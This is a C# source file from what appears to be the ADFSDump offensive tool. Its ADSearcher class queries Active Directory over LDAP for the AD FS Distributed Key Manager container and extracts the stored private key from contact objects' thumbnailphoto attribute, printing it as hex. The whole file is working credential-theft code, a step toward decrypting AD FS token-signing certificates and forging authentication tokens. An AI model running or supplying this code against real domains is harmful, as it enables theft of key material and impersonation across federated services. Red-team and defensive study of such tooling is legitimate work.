﻿using System;
using System.IO;
using System.DirectoryServices;
using System.Collections.Generic;
using System.Text;

namespace ADFSDump.ActiveDirectory
{
    public static class ADSearcher
    {
        private const string LdapFilter = "(&(thumbnailphoto=*)(objectClass=contact)(!(cn=CryptoPolicy)))";

        public static void GetPrivKey(Dictionary<string,string> arguments)
        {
            string username = "";
            string password = "";
            string domain = "";
            string server = "";
            string searchString = "";
            bool runAsUser = false;

            if(!arguments.ContainsKey("/domain"))
            {
                //no domain or server given, try to find it ourselves
                domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                searchString = "LDAP://";
            }
            if(arguments.ContainsKey("/username"))
            {
                if(arguments.ContainsKey("/password"))
                {
                    username = arguments["/username"];
                    password = arguments["/password"];
                    runAsUser = true;
                }
                else
                {
                    Console.WriteLine("[!] If you provide a username, you must provide a password!");
                    Environment.Exit(0);
                }
            }
            else
            {
                if(arguments.ContainsKey("/domain"))
                {
                    domain = arguments["/domain"];
                }
                if (arguments.ContainsKey("/server"))
                {
                    server = arguments["/server"];
                    searchString = string.Format("LDAP://{0}/", server);
                } else
                {
                    searchString = "LDAP://";
                }
            }

            Console.WriteLine("## Extracting Private Key from Active Directory Store");
            Console.WriteLine($"[-] Domain is {domain}");
            string[] domainParts = domain.Split('.');
            List<String> searchBase = new List<String>{ "CN=ADFS", "CN=Microsoft", "CN=Program Data" };
            foreach( string part in domainParts)
            {
                searchBase.Add($"DC={part}");
            }

            string ldap = $"{searchString}{string.Join(",", searchBase.ToArray())}";

            try
            {
                DirectoryEntry entry = new DirectoryEntry();
                if (runAsUser)
                {
                     entry = new DirectoryEntry(ldap, username, password);
                }
                else
                {
                     entry = new DirectoryEntry(ldap);
                }
                using (DirectorySearcher mySearcher = new DirectorySearcher(entry))
                {
                    mySearcher.Filter = (LdapFilter);
                    mySearcher.PropertiesToLoad.Add("thumbnailphoto");
                    foreach (SearchResult resEnt in mySearcher.FindAll())
                    {
                        byte[] privateKey = (byte[])resEnt.Properties["thumbnailphoto"][0];
                        string convertedPrivateKey = BitConverter.ToString(privateKey);
                        Console.WriteLine("[-] Private Key: {0}\r\n\r\n", convertedPrivateKey);
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("!!! Exception getting private key: {0}", e);
                Console.WriteLine("!!! Are you sure you are running as the AD FS service account?");
            }
        }
    }
}

